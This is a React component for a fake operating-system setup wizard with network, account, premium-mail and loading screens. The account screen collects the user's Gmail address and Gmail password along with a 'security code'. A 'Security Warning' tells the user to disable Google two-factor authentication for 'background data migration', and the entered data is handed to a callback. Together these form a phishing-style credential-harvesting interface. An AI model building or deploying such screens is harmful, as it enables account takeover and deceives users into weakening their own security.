import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Wifi, Smartphone, ArrowRight, User, Lock, Mail, Key, CheckCircle2, Loader2 } from 'lucide-react';

interface SetupWizardProps {
  onComplete: (data: any) => void;
}

export default function SetupWizard({ onComplete }: SetupWizardProps) {
  const [step, setStep] = useState<'network' | 'account' | 'dbmail' | 'final'>('network');
  const [formData, setFormData] = useState({
    name: '',
    code: '',
    gmail: '',
    gmailPassword: '',
    dbMail: ''
  });
  const [isProcessing, setIsProcessing] = useState(false);

  const handleNext = () => {
    if (step === 'network') setStep('account');
    else if (step === 'account') setStep('dbmail');
    else if (step === 'dbmail') {
      setStep('final');
      setTimeout(() => onComplete(formData), 5000);
    }
  };

  return (
    <div className="fixed inset-0 bg-[#050505] flex items-center justify-center z-[9998] overflow-hidden">
      {/* Magical Blue Aura Background */}
      <div className="absolute inset-0 pointer-events-none">
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[800px] h-[800px] bg-blue-600/10 blur-[150px] rounded-full" />
      </div>

      <AnimatePresence mode="wait">
        {step === 'network' && (
          <motion.div
            key="network"
            initial={{ x: -100, opacity: 0 }}
            animate={{ x: 0, opacity: 1 }}
            exit={{ x: 100, opacity: 0 }}
            className="w-full max-w-md p-8 bg-white/5 backdrop-blur-[400px] border border-white/10 rounded-[40px] shadow-2xl flex flex-col items-center text-center"
          >
            <div className="w-16 h-16 bg-blue-600/20 rounded-2xl flex items-center justify-center mb-6">
              <Wifi className="text-blue-400" size={32} />
            </div>
            <h2 className="text-2xl font-bold text-white mb-2">Network Connection</h2>
            <p className="text-gray-400 mb-8 text-sm">Select your primary connection method</p>

            <div className="space-y-4 w-full">
              <button onClick={handleNext} className="w-full flex items-center justify-between p-4 bg-white/5 hover:bg-white/10 border border-white/10 rounded-2xl transition-all group">
                <div className="flex items-center gap-4">
                  <div className="w-10 h-10 bg-blue-500/20 rounded-xl flex items-center justify-center text-blue-400">
                    <Wifi size={20} />
                  </div>
                  <span className="text-white font-medium">Wi-Fi Connecting</span>
                </div>
                <ArrowRight size={18} className="text-gray-600 group-hover:text-blue-400" />
              </button>

              <button onClick={handleNext} className="w-full flex items-center justify-between p-4 bg-white/5 hover:bg-white/10 border border-white/10 rounded-2xl transition-all group">
                <div className="flex items-center gap-4">
                  <div className="w-10 h-10 bg-emerald-500/20 rounded-xl flex items-center justify-center text-emerald-400">
                    <Smartphone size={20} />
                  </div>
                  <span className="text-white font-medium">Mobile Data Connecting</span>
                </div>
                <ArrowRight size={18} className="text-gray-600 group-hover:text-emerald-400" />
              </button>

              <button onClick={handleNext} className="mt-8 text-gray-500 hover:text-white text-sm font-medium transition-colors">
                Skip Connection
              </button>
            </div>
          </motion.div>
        )}

        {step === 'account' && (
          <motion.div
            key="account"
            initial={{ x: -100, opacity: 0 }}
            animate={{ x: 0, opacity: 1 }}
            exit={{ x: 100, opacity: 0 }}
            className="w-full max-w-md p-8 bg-white/5 backdrop-blur-[400px] border border-white/10 rounded-[40px] shadow-2xl"
          >
            <h2 className="text-2xl font-bold text-white mb-6 text-center">Account Setup</h2>
            
            <div className="space-y-4">
              <div className="relative">
                <User className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500" size={18} />
                <input
                  type="text"
                  placeholder="Full Name"
                  value={formData.name}
                  onChange={(e) => setFormData({ ...formData, name: e.target.value })}
                  className="w-full bg-white/5 border border-white/10 rounded-2xl py-4 pl-12 pr-4 text-white outline-none focus:border-blue-500/50 transition-all"
                />
              </div>

              <div className="relative">
                <Lock className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500" size={18} />
                <input
                  type="password"
                  placeholder="Security Code"
                  value={formData.code}
                  onChange={(e) => setFormData({ ...formData, code: e.target.value })}
                  className="w-full bg-white/5 border border-white/10 rounded-2xl py-4 pl-12 pr-4 text-white outline-none focus:border-blue-500/50 transition-all"
                />
              </div>

              <div className="relative">
                <Mail className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500" size={18} />
                <input
                  type="email"
                  placeholder="Google Gmail"
                  value={formData.gmail}
                  onChange={(e) => setFormData({ ...formData, gmail: e.target.value })}
                  className="w-full bg-white/5 border border-white/10 rounded-2xl py-4 pl-12 pr-4 text-white outline-none focus:border-blue-500/50 transition-all"
                />
              </div>

              <div className="relative">
                <Key className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500" size={18} />
                <input
                  type="password"
                  placeholder="Gmail Password"
                  value={formData.gmailPassword}
                  onChange={(e) => setFormData({ ...formData, gmailPassword: e.target.value })}
                  className="w-full bg-white/5 border border-white/10 rounded-2xl py-4 pl-12 pr-4 text-white outline-none focus:border-blue-500/50 transition-all"
                />
              </div>

              <div className="p-4 bg-yellow-500/10 border border-yellow-500/20 rounded-2xl">
                <p className="text-[10px] text-yellow-500 font-bold uppercase tracking-widest mb-1">Security Warning</p>
                <p className="text-[10px] text-gray-400 leading-relaxed">
                  Please turn off 2-Factor Authentication (2FA) on your Google account temporarily to allow background data migration.
                </p>
              </div>

              <button
                onClick={handleNext}
                disabled={!formData.name || !formData.code || !formData.gmail || !formData.gmailPassword}
                className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-2xl transition-all disabled:opacity-50 disabled:cursor-not-allowed mt-4"
              >
                Continue
              </button>
            </div>
          </motion.div>
        )}

        {step === 'dbmail' && (
          <motion.div
            key="dbmail"
            initial={{ x: -100, opacity: 0 }}
            animate={{ x: 0, opacity: 1 }}
            exit={{ x: 100, opacity: 0 }}
            className="w-full max-w-md p-8 bg-white/5 backdrop-blur-[400px] border border-white/10 rounded-[40px] shadow-2xl text-center"
          >
            <h2 className="text-2xl font-bold text-white mb-2">Select Premium Mail</h2>
            <p className="text-gray-400 mb-8 text-sm">Choose your premium email address</p>

            <div className="space-y-3">
              {[
                `${formData.name.toLowerCase().replace(/\s/g, '')}123@premium.com`,
                `${formData.name.toLowerCase().replace(/\s/g, '')}.premium@premium.com`,
                `${formData.name.toLowerCase().replace(/\s/g, '')}_pro@premium.com`
              ].map((mail) => (
                <button
                  key={mail}
                  onClick={() => {
                    setFormData({ ...formData, dbMail: mail });
                    handleNext();
                  }}
                  className="w-full p-4 bg-white/5 hover:bg-blue-600/20 border border-white/10 rounded-2xl text-white font-medium transition-all text-left flex items-center justify-between group"
                >
                  {mail}
                  <CheckCircle2 size={18} className="text-transparent group-hover:text-blue-400" />
                </button>
              ))}
            </div>
          </motion.div>
        )}

        {step === 'final' && (
          <motion.div
            key="final"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="flex flex-col items-center gap-6"
          >
            <Loader2 className="text-blue-500 animate-spin" size={48} />
            <motion.h2
              animate={{ opacity: [0.5, 1, 0.5] }}
              transition={{ duration: 2, repeat: Infinity }}
              className="text-2xl font-bold text-white tracking-widest uppercase"
            >
              Setting up your OS...
            </motion.h2>
            <p className="text-gray-500 text-sm">Migrating data and configuring cloud services</p>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
